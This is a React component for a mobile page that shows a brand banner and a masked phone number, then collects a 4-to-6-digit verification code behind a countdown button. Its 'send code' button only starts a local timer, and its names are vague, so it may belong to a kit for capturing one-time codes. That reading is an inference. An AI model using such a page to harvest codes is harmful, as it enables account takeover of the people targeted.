import type { FC } from 'react'
import { useState, useMemo, useRef } from 'react'
import { useModuleData } from "../templates/moduleContext";
import { Button, Image, Input } from 'antd'
import clsx from "clsx"
import { useH5Store } from '../store'

const timeWaitCode: number = 120;

const moduleBgMap: any = {
  module1: 'green', module2: 'green', module3: 'blue', module4: 'red',
  module5: 'blue', module6: 'red', module7: 'blue', module8: 'blue',
  module9: 'blue', module10: 'blue',
};
const moduleImgMap: { [key: string]: any } = {
  module1: 'public/banner/w.png', module2: 'public/banner/w.png', module3: 'public/banner/qd.png', module4: 'public/banner/t.png',
  module5: 'public/banner/q.png', module6: 'public/banner/b.png', module7: '', module8: '',
  module9: '', module10: '',
};

export const Page3: FC = () => {
  const { module, submit } = useModuleData()
  const [second, setSecond] = useState(0);
  const item1 = useH5Store.getState().item1
  const timerRef = useRef<NodeJS.Timeout | null>(null);
  const { infoArr } = useH5Store();
  const [code, setCode] = useState('');
  const isWaiting = useMemo(() => second !== 0, [second]);

  const func1 = (): void => {
    if (isWaiting) return
    setSecond(timeWaitCode)
    timerRef.current = setInterval(() => {
      setSecond(prev => prev - 1);
    }, 1000);
  }
  return <div className={clsx('w-screen h-screen  text-sm flex flex-col items-center gap-y-2')}>
      <Image src={moduleImgMap[module]}></Image>
      <div className="text-[#444] text-xl mt-8 font-bold">{infoArr[10]}</div>
      <div className="text-[#888]">请通过{item1.slice(0, 3)}****{item1.slice(7, 11)}</div>
      <div className="w-[80vw]">
        <Input
          className=" my-8 " size="large" suffix={
            <div className={clsx(isWaiting ? 'text-gray-400' : `text-${moduleBgMap[module]}-500`,)} onClick={() => func1()}>{isWaiting ? `${second} 秒` : infoArr[11]}</div>
          }
          value={code} onChange={(v) => setCode(v.target.value)}
        ></Input>
        <Button className="w-full text-xl" size='large' disabled={!(/\d{4,6}/.test(code))} type='primary' variant="solid" color={moduleBgMap[module]} onClick={() => submit()}>提交</Button>
      </div>

    </div>
}
